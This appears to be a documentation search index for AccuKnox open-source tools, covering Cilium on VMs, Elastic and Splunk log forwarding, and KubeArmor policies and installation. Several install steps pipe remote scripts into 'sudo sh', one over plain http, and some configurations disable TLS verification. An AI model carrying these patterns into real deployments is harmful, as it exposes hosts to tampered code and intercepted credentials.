--service-type NodePort b) If you are using GKE, EKS or Azure, use the following command. cilium clustermesh enable --apiserver-image=docker.io/accuknox/cilium-clustermesh-apiserver:latest --service-type LoadBalancer 5. Onboard VMs in the cluster \u00b6 a) Create an entry for each VM and assign labels to them. cilium clustermesh vm create <vm-hostname> --labels key1=value1,key2=value2..keyN=valueN hostname - VM's hostname key1=value1,key2=value2...keyN=valueN - Labels of the VM (similar to pod labels). b) Repeat the above command for each VM you wish to add to the cluster. c) Once all the VMs are added, verify it. cilium clustermesh vm status 6. Generate VM installation script \u00b6 a) Generate the shell script to install Cilium in VMs. cilium clustermesh vm install <file-name> --config devices=<interfaces>,enable-host-firewall,enable-hubble=true,hubble-listen-address=:4244,hubble-disable-tls=true,external-workload file-name - script name (example, cilium-vm-XYZ-install.sh ) interfaces - one or more, comma separated list of VM's physical interfaces (example - eth0,eth1 ). b) Open the generated script and edit the value of CILIUM_IMAGE to ${1:-docker.io/accuknox/cilium:latest} c) Note: - If the host interface names of the VMs differs from one VM to another VM, then generate a script of each VM by configuring the interface parameter appropriately. - If the interface name is same for all the VMs, then you could generate the script once and use it across all the VMs. 7. Install Cilium in the VMs \u00b6 a) Copy the installation script to the VMs that are added to the cluster and run the scripts in the VM's shell. b) Once the installation is successful in the VM, check the status by executing the following command in VM's shell. cilium status 8. Enforcing network policies in VM \u00b6 Once the Cilium installation in VMs are completed, users can start to configure network policies using kubectl . A sample Cilium network policy will look similar to the following YAML. apiVersion : \"cilium.io/v2\" kind : CiliumClusterwideNetworkPolicy metadata : name : \"rule1\" spec : description : \"L4 policy to allow traffic only at port 80/TCP\" nodeSelector : matchLabels : name : vm1 ingress : - fromEndpoints : - matchLabels : name : vm2 toPorts : - ports : - port : \"80\" protocol : TCP The above policy allows ingress traffic to VM with label name: vm1 from VM with label name: vm2 at only port 80/TCP. All other ingress traffic to VM with name: vm1 will be blocked because of this policy. Users can apply polices in the cluster using kubectl just like how resources are managed in k8s usually. kubectl apply -f <yaml-file/url> More examples of the network policies and their syntax are available in the official Cilium docs page . Note : For policies that involves VMs, the kind should always be CiliumClusterwideNetworkPolicy 9. Network Observability in VMs \u00b6 Users can use hubble CLI tool that comes along with the Cilium installation to monitor network traffic and policy enforcement in VMs. docker exec -it cilium hubble observe -f","title":"Cilium in VMs"},{"location":"open-source/cilium-vm-k8s/#deploying-cilium-in-vms","text":"Cilium is a network policy enforcement engine that can be used both in k8s and VMs. Using Cilium with Kubernetes, one can protect both k8s workloads (pods, services) and virtual machines from network vulnerabilities.","title":"Deploying Cilium in VMs"},{"location":"open-source/cilium-vm-k8s/#deployment-steps-for-cilium-vm","text":"","title":"Deployment Steps for Cilium VM"},{"location":"open-source/cilium-vm-k8s/#dependencies","text":"1) A k8s cluster - A k8s cluster (it can be a single node cluster) to act as a control plane and distribute information about identities, labels and IPs of the VMs. Users can manage network polices of the VMs using kubectl just like how pods or services are managed in k8s usually. 2) Docker >= 20.10 should be installed in all the VMs.","title":"Dependencies"},{"location":"open-source/cilium-vm-k8s/#1-download-and-install-cilium-cli","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/download/v0.10.2/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum }","title":"1. Download and Install Cilium CLI"},{"location":"open-source/cilium-vm-k8s/#2-setup-cilium-in-k8s-cluster","text":"cilium install --config tunnel = vxlan --agent-image docker.io/accuknox/cilium:latest --operator-image docker.io/accuknox/cilium-operator-generic:latest Note: If you are using AWS or Azure managed kubernetes cluster, then change the value of --operator-image option in the above command to docker.io/accuknox/cilium-operator-aws:latest or docker.io/accuknox/cilium-operator-azure:latest respectively.","title":"2. Setup Cilium in K8s Cluster"},{"location":"open-source/cilium-vm-k8s/#3-check-the-cilium-status","text":"cilium status There should not be any errors.","title":"3. Check the Cilium status"},{"location":"open-source/cilium-vm-k8s/#4-enable-cilium-clustermesh","text":"a) If you are using self-managed k8s, use the following command to enable clustermesh . cilium clustermesh enable --apiserver-image=docker.io/accuknox/cilium-clustermesh-apiserver:latest --service-type NodePort b) If you are using GKE, EKS or Azure, use the following command. cilium clustermesh enable --apiserver-image=docker.io/accuknox/cilium-clustermesh-apiserver:latest --service-type LoadBalancer","title":"4. Enable Cilium clustermesh"},{"location":"open-source/cilium-vm-k8s/#5-onboard-vms-in-the-cluster","text":"a) Create an entry for each VM and assign labels to them. cilium clustermesh vm create <vm-hostname> --labels key1=value1,key2=value2..keyN=valueN hostname - VM's hostname key1=value1,key2=value2...keyN=valueN - Labels of the VM (similar to pod labels). b) Repeat the above command for each VM you wish to add to the cluster. c) Once all the VMs are added, verify it. cilium clustermesh vm status","title":"5. Onboard VMs in the cluster"},{"location":"open-source/cilium-vm-k8s/#6-generate-vm-installation-script","text":"a) Generate the shell script to install Cilium in VMs. cilium clustermesh vm install <file-name> --config devices=<interfaces>,enable-host-firewall,enable-hubble=true,hubble-listen-address=:4244,hubble-disable-tls=true,external-workload file-name - script name (example, cilium-vm-XYZ-install.sh ) interfaces - one or more, comma separated list of VM's physical interfaces (example - eth0,eth1 ). b) Open the generated script and edit the value of CILIUM_IMAGE to ${1:-docker.io/accuknox/cilium:latest} c) Note: - If the host interface names of the VMs differs from one VM to another VM, then generate a script of each VM by configuring the interface parameter appropriately. - If the interface name is same for all the VMs, then you could generate the script once and use it across all the VMs.","title":"6. Generate VM installation script"},{"location":"open-source/cilium-vm-k8s/#7-install-cilium-in-the-vms","text":"a) Copy the installation script to the VMs that are added to the cluster and run the scripts in the VM's shell. b) Once the installation is successful in the VM, check the status by executing the following command in VM's shell. cilium status","title":"7. Install Cilium in the VMs"},{"location":"open-source/cilium-vm-k8s/#8-enforcing-network-policies-in-vm","text":"Once the Cilium installation in VMs are completed, users can start to configure network policies using kubectl . A sample Cilium network policy will look similar to the following YAML. apiVersion : \"cilium.io/v2\" kind : CiliumClusterwideNetworkPolicy metadata : name : \"rule1\" spec : description : \"L4 policy to allow traffic only at port 80/TCP\" nodeSelector : matchLabels : name : vm1 ingress : - fromEndpoints : - matchLabels : name : vm2 toPorts : - ports : - port : \"80\" protocol : TCP The above policy allows ingress traffic to VM with label name: vm1 from VM with label name: vm2 at only port 80/TCP. All other ingress traffic to VM with name: vm1 will be blocked because of this policy. Users can apply polices in the cluster using kubectl just like how resources are managed in k8s usually. kubectl apply -f <yaml-file/url> More examples of the network policies and their syntax are available in the official Cilium docs page . Note : For policies that involves VMs, the kind should always be CiliumClusterwideNetworkPolicy","title":"8. Enforcing network policies in VM"},{"location":"open-source/cilium-vm-k8s/#9-network-observability-in-vms","text":"Users can use hubble CLI tool that comes along with the Cilium installation to monitor network traffic and policy enforcement in VMs. docker exec -it cilium hubble observe -f","title":"9. Network Observability in VMs"},{"location":"open-source/ciliummatricx/","text":"VM Support Provider \u2003 \u2003 \u2003 Distro \u2003 \u2003 \u2003\u2003 Support \u2003 SUSE \u2003 \u2003 \u2003SUSE Enterprise 15 \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 10 (Buster) \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 11 (Bullseye) \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 18.04 \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 20.04 \u2003 \u2003 \u2003 Yes Kubernetes Support Provider Distro Support AWS EKS-Ubuntu Server 20.04 LTS Yes K8's Minikube on VirtualBox Yes Canonical MicroK8's Yes Rancher K3's on Ubuntu Yes Google GKE-COS (Rapid/Regular Release) Yes Google GKE-Ubuntu (Rapid/Regular Release) Yes AWS EKS Amazon Linux 2 Yes","title":"Cilium Support Matrix"},{"location":"open-source/integration/","text":"Elastic and Splunk Integration \u00b6 Metrics and Logs \u00b6 The On-Prem Feeder provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent . The On-Prem Feeder agent also has the capability of pushing metrics into On Prem Prometheus. Prometheus collects and stores its metrics as time series data i.e., metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels . Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack. The below section explains installation of Feeder Agent , Elastic(Optional) and Prometheus(Optional) 1. Installation of Feeder Agent \u00b6 As we are passing the elastic and kibana resource in the values.yaml of the feeder service , we can toggle the elastic/kibana installation along with feeder-service as below. helm repo add accuknox-onprem-agents https://USERNAME:password@onprem.accuknox.com/repository/accuknox-onprem-agents helm repo update helm search repo accuknox-onprem-agents kubectl create ns accuknox-feeder-service helm upgrade --install accuknox-eck-operator accuknox-onprem-agents/eck-operator ( only if ELK is required ) helm upgrade --install accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service 2. Installation of Elastic \u00b6 Please enable the elastic resource as true to install Elastic along with feeder. helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service Note: If there is ELK set up already running on the cluster, the CRD apply may fail. The Elastic master and data pods should be in up and running state on the same namespace. Additionally the same can be enabled using below command by updating values.yaml elasticsearch : enabled : true 3. Installation of Kibana \u00b6 Please enable the Kibana resource as true to install Kibana along with feeder. helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service The Kibana pods should be in up and running state on the same namespace. Additionally the same can be enabled using below command by updating values.yaml kibana : enabled : true 4. View Metrics \u00b6 Feeder as a SERVER Please toggle the below variable for to push metrics directly to an endpoint. GRPC_SERVER_ENABLED value : true ``` - Once the feeder agent starts running, the metrics should start flowing up. - Please use `localhost:8000/metrics` endpoint to check metrics flow. <b> Feeder as a CLIENT</b> - Please toggle the below variable for to push metrics to GRPC Server in SAAS Platform. ``` yaml GRPC_CLIENT_ENABLED value : true GRPC_SERVER_URL value : \"localhost\" GRPC_SERVER_PORT value : 8000 Once the feeder agent starts running, the metrics will be pushed to prometheus in SAAS and can be viewed in ACCUKNOX platform UI. Note: All of the above can be updated runtime as in Step 5.5.3 4.1 Installation of Prometheus (Required only when Feeder acts as Server) \u00b6 Please refer the page for Installation of Prometheus . 4.2 Prometheus Configuration:(Required only when Feeder acts as Server) \u00b6 Please add the below configuration in prometheus (on Prem) to see the agent metrics in Prometheus job_name : <feeder>-chart honor_timestamps : true scrape_interval : 30s scrape_timeout : 10s metrics_path : /metrics scheme : http follow_redirects : true static_configs : - targets : - <localhost>:8000 5. View Logs in Elastic \u00b6 5.1. Beats Setup \u00b6 The Beats agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . The logs are forwarded to Elastic when the below env variable is enabled. - name : ELASTIC_FEEDER_ENABLED value : true 5.2. Elastic Configuration Parameters: \u00b6 We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace 5.3. Updating Elastic Search Host (Runtime):(If required to switch different Elastic host) \u00b6 kubectl set env deploy/feeder-service -n accuknox-feeder-service ELASTICSEARCH_HOST = \"https://elasticsearch-es-http.test-feed.svc.cluster.local:9200\" ELASTICSEARCH_USERNAME = elastic ELASTICSEARCH_PASSWORD = xxxxxxxxxx - Note: Likewise other configuration parameters can be updated in Runtime. 5.4. Validate Log Path: \u00b6 To view logs and to check filebeat (status) please use the below command kubectl exec -it -n accuknox-feeder-service pod/<podname> -c filebeat-sidecar -- /bin/bash filebeat -e To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log 6. View Logs in Splunk \u00b6 The logs are forwarded to Splunk when the below env variable is enabled. - name : SPLUNK_FEEDER_ENABLED value : true The below Configuration parameters can be updated for Splunk configuration. (If Default params needs to be modified) - name : SPLUNK_FEEDER_URL value : https://<splunk-host> - name : SPLUNK_FEEDER_TOKEN value : \"Token configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE_TYPE value : \"Source Type configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE value : \"Splunk Source configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_INDEX value : \"Splunk Index configured on HEC in Splunk App\" 6.1. Enabling/Disabling Splunk (Runtime): \u00b6 kubectl set env deploy/feeder -n feeder-service SPLUNK_FEEDER_ENABLED = \"true\" - By enabling the flag to true (as above), the logs will be pushed to Splunk.Conversely disabling it to \"false\" will stop pushing logs. - Note: Likewise other configuration parameters can be updated in Runtime.","title":"Integration Guide"},{"location":"open-source/integration/#elastic-and-splunk-integration","text":"","title":"Elastic and Splunk Integration"},{"location":"open-source/integration/#metrics-and-logs","text":"The On-Prem Feeder provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent . The On-Prem Feeder agent also has the capability of pushing metrics into On Prem Prometheus. Prometheus collects and stores its metrics as time series data i.e., metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels . Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack. The below section explains installation of Feeder Agent , Elastic(Optional) and Prometheus(Optional)","title":"Metrics and Logs"},{"location":"open-source/integration/#1-installation-of-feeder-agent","text":"As we are passing the elastic and kibana resource in the values.yaml of the feeder service , we can toggle the elastic/kibana installation along with feeder-service as below. helm repo add accuknox-onprem-agents https://USERNAME:password@onprem.accuknox.com/repository/accuknox-onprem-agents helm repo update helm search repo accuknox-onprem-agents kubectl create ns accuknox-feeder-service helm upgrade --install accuknox-eck-operator accuknox-onprem-agents/eck-operator ( only if ELK is required ) helm upgrade --install accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service","title":"1. Installation of Feeder Agent"},{"location":"open-source/integration/#2-installation-of-elastic","text":"Please enable the elastic resource as true to install Elastic along with feeder. helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service Note: If there is ELK set up already running on the cluster, the CRD apply may fail. The Elastic master and data pods should be in up and running state on the same namespace. Additionally the same can be enabled using below command by updating values.yaml elasticsearch : enabled : true","title":"2. Installation of Elastic"},{"location":"open-source/integration/#3-installation-of-kibana","text":"Please enable the Kibana resource as true to install Kibana along with feeder. helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service The Kibana pods should be in up and running state on the same namespace. Additionally the same can be enabled using below command by updating values.yaml kibana : enabled : true","title":"3. Installation of Kibana"},{"location":"open-source/integration/#4-view-metrics","text":"Feeder as a SERVER Please toggle the below variable for to push metrics directly to an endpoint. GRPC_SERVER_ENABLED value : true ``` - Once the feeder agent starts running, the metrics should start flowing up. - Please use `localhost:8000/metrics` endpoint to check metrics flow. <b> Feeder as a CLIENT</b> - Please toggle the below variable for to push metrics to GRPC Server in SAAS Platform. ``` yaml GRPC_CLIENT_ENABLED value : true GRPC_SERVER_URL value : \"localhost\" GRPC_SERVER_PORT value : 8000 Once the feeder agent starts running, the metrics will be pushed to prometheus in SAAS and can be viewed in ACCUKNOX platform UI. Note: All of the above can be updated runtime as in Step 5.5.3","title":"4. View Metrics"},{"location":"open-source/integration/#41-installation-of-prometheus-required-only-when-feeder-acts-as-server","text":"Please refer the page for Installation of Prometheus .","title":"4.1 Installation of Prometheus (Required only when Feeder acts as Server)"},{"location":"open-source/integration/#42-prometheus-configurationrequired-only-when-feeder-acts-as-server","text":"Please add the below configuration in prometheus (on Prem) to see the agent metrics in Prometheus job_name : <feeder>-chart honor_timestamps : true scrape_interval : 30s scrape_timeout : 10s metrics_path : /metrics scheme : http follow_redirects : true static_configs : - targets : - <localhost>:8000","title":"4.2 Prometheus Configuration:(Required only when Feeder acts as Server)"},{"location":"open-source/integration/#5-view-logs-in-elastic","text":"","title":"5. View Logs in Elastic"},{"location":"open-source/integration/#51-beats-setup","text":"The Beats agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . The logs are forwarded to Elastic when the below env variable is enabled. - name : ELASTIC_FEEDER_ENABLED value : true","title":"5.1. Beats Setup"},{"location":"open-source/integration/#52-elastic-configuration-parameters","text":"We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace","title":"5.2. Elastic Configuration Parameters:"},{"location":"open-source/integration/#53-updating-elastic-search-host-runtimeif-required-to-switch-different-elastic-host","text":"kubectl set env deploy/feeder-service -n accuknox-feeder-service ELASTICSEARCH_HOST = \"https://elasticsearch-es-http.test-feed.svc.cluster.local:9200\" ELASTICSEARCH_USERNAME = elastic ELASTICSEARCH_PASSWORD = xxxxxxxxxx - Note: Likewise other configuration parameters can be updated in Runtime.","title":"5.3. Updating Elastic Search Host (Runtime):(If required to switch different Elastic host)"},{"location":"open-source/integration/#54-validate-log-path","text":"To view logs and to check filebeat (status) please use the below command kubectl exec -it -n accuknox-feeder-service pod/<podname> -c filebeat-sidecar -- /bin/bash filebeat -e To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log","title":"5.4. Validate Log Path:"},{"location":"open-source/integration/#6-view-logs-in-splunk","text":"The logs are forwarded to Splunk when the below env variable is enabled. - name : SPLUNK_FEEDER_ENABLED value : true The below Configuration parameters can be updated for Splunk configuration. (If Default params needs to be modified) - name : SPLUNK_FEEDER_URL value : https://<splunk-host> - name : SPLUNK_FEEDER_TOKEN value : \"Token configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE_TYPE value : \"Source Type configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE value : \"Splunk Source configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_INDEX value : \"Splunk Index configured on HEC in Splunk App\"","title":"6. View Logs in Splunk"},{"location":"open-source/integration/#61-enablingdisabling-splunk-runtime","text":"kubectl set env deploy/feeder -n feeder-service SPLUNK_FEEDER_ENABLED = \"true\" - By enabling the flag to true (as above), the logs will be pushed to Splunk.Conversely disabling it to \"false\" will stop pushing logs. - Note: Likewise other configuration parameters can be updated in Runtime.","title":"6.1. Enabling/Disabling Splunk (Runtime):"},{"location":"open-source/kubearmor-audit/","text":"Using Kubearmor in audit-only mode \u00b6 KubeArmor allows you to specify Allow policies (aka whitelist policies). Any actions outside of these Allow policies will either be audited or blocked. Currently, the default posture is block. The default posture can be set at: the global level at individual namespace level Setting Global posture \u00b6 Global default posture is configured using configuration options passed to KubeArmor using configuration file defaultFilePosture : block # or audit defaultNetworkPosture : block # or audit defaultCapabilitiesPosture : block # or audit Or using command line flags with the KubeArmor binary -defaultFilePosture string configuring default enforcement action in global file context [ audit,block ] ( default \"block\" ) -defaultNetworkPosture string configuring default enforcement action in global network context [ audit,block ] ( default \"block\" ) -defaultCapabilitiesPosture string configuring default enforcement action in global capability context [ audit,block ] ( default \"block\" ) Namespace Default Posture \u00b6 We use namespace annotations to configure default posture per namespace. Supported annotations keys are kubearmor-file-posture , kubearmor-network-posture and kubearmor-capabilities-posture with values block or audit . If a namespace is annotated with a supported key and an invalid value ( like kubearmor-file-posture=invalid ), KubeArmor will update the value with the global default posture ( i.e. to kubearmor-file-posture=block ). Example \u00b6 ~\u276f\u276f\u276f kubectl annotate ns multiubuntu kubearmor-file-posture=audit namespace/multiubuntu annotated ~\u276f\u276f\u276f kubectl describe ns multiubuntu Name: multiubuntu Labels: kubernetes.io/metadata.name=multiubuntu Annotations: kubearmor-file-posture: audit Status: Active","title":"Using default Audit mode"},{"location":"open-source/kubearmor-audit/#using-kubearmor-in-audit-only-mode","text":"KubeArmor allows you to specify Allow policies (aka whitelist policies). Any actions outside of these Allow policies will either be audited or blocked. Currently, the default posture is block. The default posture can be set at: the global level at individual namespace level","title":"Using Kubearmor in audit-only mode"},{"location":"open-source/kubearmor-audit/#setting-global-posture","text":"Global default posture is configured using configuration options passed to KubeArmor using configuration file defaultFilePosture : block # or audit defaultNetworkPosture : block # or audit defaultCapabilitiesPosture : block # or audit Or using command line flags with the KubeArmor binary -defaultFilePosture string configuring default enforcement action in global file context [ audit,block ] ( default \"block\" ) -defaultNetworkPosture string configuring default enforcement action in global network context [ audit,block ] ( default \"block\" ) -defaultCapabilitiesPosture string configuring default enforcement action in global capability context [ audit,block ] ( default \"block\" )","title":"Setting Global posture"},{"location":"open-source/kubearmor-audit/#namespace-default-posture","text":"We use namespace annotations to configure default posture per namespace. Supported annotations keys are kubearmor-file-posture , kubearmor-network-posture and kubearmor-capabilities-posture with values block or audit . If a namespace is annotated with a supported key and an invalid value ( like kubearmor-file-posture=invalid ), KubeArmor will update the value with the global default posture ( i.e. to kubearmor-file-posture=block ).","title":"Namespace Default Posture"},{"location":"open-source/kubearmor-audit/#example","text":"~\u276f\u276f\u276f kubectl annotate ns multiubuntu kubearmor-file-posture=audit namespace/multiubuntu annotated ~\u276f\u276f\u276f kubectl describe ns multiubuntu Name: multiubuntu Labels: kubernetes.io/metadata.name=multiubuntu Annotations: kubearmor-file-posture: audit Status: Active","title":"Example"},{"location":"open-source/kubearmor-install/","text":"KubeArmor: Deployment Guide \u00b6 Deployment Steps for KubeArmor & kArmor CLI \u00b6 1. Download and install karmor CLI \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin 2. Install KubeArmor \u00b6 karmor install It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings. 3. Deploying sample app and policies \u00b6 a. Deploy sample multiubuntu app \u00b6 kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/master/examples/multiubuntu/multiubuntu-deployment.yaml b. Deploy sample policies \u00b6 kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/master/examples/multiubuntu/security-policies/ksp-group-1-proc-path-block.yaml This sample policy blocks execution of sleep command in ubuntu-1 pods. c. Simulate policy violation \u00b6 $ kubectl -n multiubuntu exec -it POD_NAME_FOR_UBUNTU_1 -- bash # sleep 1 ( Permission Denied ) Substitute POD_NAME_FOR_UBUNTU_1 with the actual pod name from kubectl get pods -n multiubuntu . 4. Getting Alerts/Telemetry from KubeArmor \u00b6 a. Enable port-forwarding for KubeArmor relay \u00b6 kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 b. Observing logs using karmor cli \u00b6 karmor log K8s platforms tested \u00b6 Google Kubernetes Engine (GKE) Container Optimized OS (COS) GKE Ubuntu image Amazon Elastic Kubernetes Service (EKS) Self-managed (on-prem) k8s Local k8s engines (microk8s, k3s, minikube)","title":"KubeArmor on k8s"},{"location":"open-source/kubearmor-install/#kubearmor-deployment-guide","text":"","title":"KubeArmor: Deployment Guide"},{"location":"open-source/kubearmor-install/#deployment-steps-for-kubearmor-karmor-cli","text":"","title":"Deployment Steps for KubeArmor &amp; kArmor CLI"},{"location":"open-source/kubearmor-install/#1-download-and-install-karmor-cli","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"1. Download and install karmor CLI"},{"location":"open-source/kubearmor-install/#2-install-kubearmor","text":"karmor install It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings.","title":"2. Install KubeArmor"},{"location":"open-source/kubearmor-install/#3-deploying-sample-app-and-policies","text":"","title":"3. Deploying sample app and policies"},{"location":"open-source/kubearmor-install/#a-deploy-sample-multiubuntu-app","text":"kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/master/examples/multiubuntu/multiubuntu-deployment.yaml","title":"a. Deploy sample multiubuntu app"},{"location":"open-source/kubearmor-install/#b-deploy-sample-policies","text":"kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/master/examples/multiubuntu/security-policies/ksp-group-1-proc-path-block.yaml This sample policy blocks execution of sleep command in ubuntu-1 pods.","title":"b. Deploy sample policies"},{"location":"open-source/kubearmor-install/#c-simulate-policy-violation","text":"$ kubectl -n multiubuntu exec -it POD_NAME_FOR_UBUNTU_1 -- bash # sleep 1 ( Permission Denied ) Substitute POD_NAME_FOR_UBUNTU_1 with the actual pod name from kubectl get pods -n multiubuntu .","title":"c. Simulate policy violation"},{"location":"open-source/kubearmor-install/#4-getting-alertstelemetry-from-kubearmor","text":"","title":"4. Getting Alerts/Telemetry from KubeArmor"},{"location":"open-source/kubearmor-install/#a-enable-port-forwarding-for-kubearmor-relay","text":"kubectl port-forward -n kube-system svc/kubearmor 32767 :32767","title":"a. Enable port-forwarding for KubeArmor relay"},{"location":"open-source/kubearmor-install/#b-observing-logs-using-karmor-cli","text":"karmor log","title":"b. Observing logs using karmor cli"},{"location":"open-source/kubearmor-install/#k8s-platforms-tested","text":"Google Kubernetes Engine (GKE) Container Optimized OS (COS) GKE Ubuntu image Amazon Elastic Kubernetes Service (EKS) Self-managed (on-prem) k8s Local k8s engines (microk8s, k3s, minikube)","title":"K8s platforms tested"},{"location":"open-source/kubearmor-vm/","text":"KubeArmor on VM/Bare-Metal \u00b6 KubeArmor is a Runtime Security engine that can protect your applications from unknown threats. This recipe explains how to use KubeArmor directly on VM/Bare-Metal host and was tested on Ubuntu hosts. The recipe installs kubearmor as systemd process and karmor cli tool to manage policies and show alerts/telemetry. Download and Install KubeArmor \u00b6 Install pre-requisites sudo apt update && sudo apt upgrade \\ sudo apt install bpfcc-tools linux-headers- $( uname -r ) \\ sudo apt install make libelf-dev llvm clang linux-headers-generic Install any of the following packages for bpf-tool depending on your system environment. sudo apt install linux-intel-iotg-5.15-tools-common sudo apt install linux-oem-5.6-tools-common sudo apt install linux-tools-common sudo apt install linux-iot-tools-common sudo apt install linux-tools-gcp sudo apt install linux-cloud-tools-gcp To install Kubearmor copy the whole commands and run it:\\ curl -s https://api.github.com/repos/kubearmor/KubeArmor/releases/latest \\ | grep \"browser_download_url.*deb\" \\ | cut -d : -f 2 ,3 \\ | tr -d \\\" \\ | wget -qi - sudo dpkg -i kubearmor_*_linux-amd64.deb Start KubeArmor \u00b6 sudo systemctl enable kubearmor && sudo systemctl start kubearmor Check kubearmor status using sudo systemctl status kubearmor or use sudo journalctl -u kubearmor -f to continuously monitor kubearmor logs. Apply sample policy \u00b6 Following policy is to deny execution of sleep binary on the host: sleepdenypolicy.yaml 1 2 3 4 5 6 7 8 9 10 apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : /usr/bin/sleep # try sleep 1 action : Block Save the above policy to sleepdenypolicy.yaml To install karmor cli tool: curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin Then apply policy: karmor vm policy add sleepdenypolicy.yaml Now if you run sleep command, the process would be denied execution. Get Alerts for policies and telemetry \u00b6 karmor log --json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \"Timestamp\" : 1639803960 , \"UpdatedTime\" : \"2021-12-18T05:06:00.077564Z\" , \"ClusterName\" : \"Default\" , \"HostName\" : \"pandora\" , \"HostPID\" : 3390423 , \"PPID\" : 168556 , \"PID\" : 3390423 , \"UID\" : 1000 , \"PolicyName\" : \"hsp-kubearmor-dev-proc-path-block\" , \"Severity\" : \"1\" , \"Type\" : \"MatchedHostPolicy\" , \"Source\" : \"zsh\" , \"Operation\" : \"Process\" , \"Resource\" : \"/usr/bin/sleep\" , \"Data\" : \"syscall=SYS_EXECVE\" , \"Action\" : \"Block\" , \"Result\" : \"Permission denied\" }","title":"KubeArmor on 